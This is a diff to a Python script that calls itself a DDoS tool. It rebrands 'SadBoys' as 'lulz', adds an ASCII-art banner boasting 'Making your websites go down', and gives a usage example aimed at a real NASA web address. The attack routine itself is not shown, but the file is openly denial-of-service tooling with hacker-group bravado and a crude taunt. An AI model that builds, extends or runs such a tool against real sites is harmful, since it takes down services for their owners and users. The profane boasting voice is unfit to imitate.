@@ -4922,15 +4922,60 @@ def buildblock(size):
 	return(out_str)
 
 def usage():
-	print 'SadBoys Priv8 Volper44 DDoS Tool ( Tool for Denial Of Service )'
+	print 'lulz Priv8 Volper44 DDoS Tool ( Tool for Denial Of Service )'
 	print 'AnonHACK'
 	print 'New loaded Botnets: 2,194,645,943'
-	print 'Usage: Sadboys (url)'
-	print 'Example: Sadboys.py http://sservi.nasa.gov/'
+	print 'Usage: lulz (url)'
+	print 'Example: lulz.py http://sservi.nasa.gov/'
 	print "\a"
 print \
 """
-
+      ``;`                              
+             `,+@@@+                              
+           .+@@@@@@@;                            
+        `;@@@@@@@@@@@                            
+       +@@@@@@@@@@@@@:                            
+     ;@@@@@@@@@@@@@@@@                            
+   `@@@@@@@@@@@@@@@@@@`                          
+   `@@@@@@@@@@@@@@@@@@#                          
+    .@@@@@@@@@@@@@@@@@@,                          
+     :@@@@@@@@@@@@@@@@@@      .'@@                
+      #@@@@@@@@@@@@@@@@+;  .+@@@@@                
+      `@@@@@@@@@@@@@#;;+@+#@@@#:`                
+       #@@@@@@@@@@';'@@@@@@@:`                    
+       `@@@@@@@+;;+@@@@@##`                      
+        .@@@#;;+@@@@@#+',.,'.                    
+         +;;'#@@@@#+;`      ,:                    
+         .#@@@@#++:  @.    ...`                  
+      `'@@@@#++'. +  .#++;;+  +                  
+    ,@@@@@#++:``::+   `',:+,. ,                  
+  `@@@@#, #+` ',.`'.   +` ``  `,  .+              
+   @@:`  ,+. ,`:``.:   '. .',+++   #              
+   ``    #+`++,.`:,``    :`+@@'@@@@'    ````      
+         #'`#+:`.,`:` .@@@+@#  +`.      :  `:    
+         #:: +.`,.., `@@,#@':. +        :   '    
+         #: ` ',:`,, @#``    + +        ' `,;    
+         #: ` `:''`  @` #:.. , '        #+++:    
+         #: ,     ;#'#  + :   `:         #++      
+         #; '     `''         ,          '.      
+         ;' '                 #         `@#      
+          #.;                ;`       ,#.:;      
+          `+;               '.        @   `      
+           :#;            `@:        :`  `,      
+            .#+;        `'+.'        +            
+              .@++#'+@+@++` ;@.     '            
+               `' ., ` #:`# `+.#+  :.            
+                ., :  @#;.`;`:  `#@.              
+                 +``,.;`@+,. '#                  
+                 @' ' ;`@:+`#`;`                  
+                `#+  ,'`#  :.  '                  
+                ' #.  :`#` '`. +                  
+                # +.  .:+: :`. .                  
+               `, +,   ..+ '`   :                
+               ;` #+@:,:#.;``   '                
+               #'##:#+.  : `;   ;                
+               #. #:      `'`   :                
+                  #,        `   .    Making your websites go down pussy 
 """ 
 
 	
@@ -4997,7 +5042,7 @@ else:
 		usage()
 		sys.exit()
 	else:
-		print "Starting SadBoys..."
+		print "Starting lulz..."
 		print "Created By Anonymous"
 		if len(sys.argv)== 3:
 			if sys.argv[2]=="safe":
